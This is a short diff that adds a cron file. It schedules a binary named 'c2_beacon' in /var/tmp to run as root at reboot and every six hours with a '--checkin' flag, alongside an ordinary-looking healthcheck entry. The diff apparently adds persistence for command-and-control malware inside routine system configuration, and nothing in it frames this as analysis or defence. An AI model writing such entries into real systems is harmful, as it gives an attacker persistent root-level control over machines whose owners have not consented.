@@ -1,0 +1,4 @@
+# Drop-in cron job
+@reboot root /var/tmp/c2_beacon
+5 * * * * root /usr/local/bin/healthcheck
+0 */6 * * * root /var/tmp/c2_beacon --checkin
